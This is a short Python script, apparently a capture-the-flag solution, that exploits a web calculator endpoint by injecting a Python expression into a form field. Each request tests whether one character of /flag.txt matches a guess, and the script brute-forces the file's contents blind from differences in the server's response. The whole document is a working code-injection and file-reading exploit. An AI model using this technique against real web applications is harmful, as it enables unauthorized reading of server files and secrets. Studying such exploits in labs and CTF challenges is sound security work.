#!/usr/bin/python3

import string
import aiohttp
import asyncio
import sys

if len(sys.argv) < 2:
    print("Usage: solve.py http://host:port/")
    exit()

url = sys.argv[1]
w = string.ascii_lowercase + ''.join([str(x) for x in range(0, 10)]) + '{}_'

check = "1 if open('/flag.txt', 'r').read()[{}] == '{}' else None"

async def try_char(sess, pos, char):
    async with sess.post(url + "calculator", data={'mode': 'arithmetic', 'n1': check.format(pos, char), 'add': '+', 'n2': ' '}) as r:
        text = await r.text()
        if 'flag.txt' in text:
            return True, char

        return False, char

async def main():
    flag = ""
    async with aiohttp.ClientSession() as session:
        while '}' not in flag:
            futures = []
            for c in w:
                futures.append(try_char(session, len(flag), c))
            for coro in asyncio.as_completed(futures):
                res = await coro
                if res[0] is True:
                    flag += res[1]
            print(flag)

asyncio.run(main())
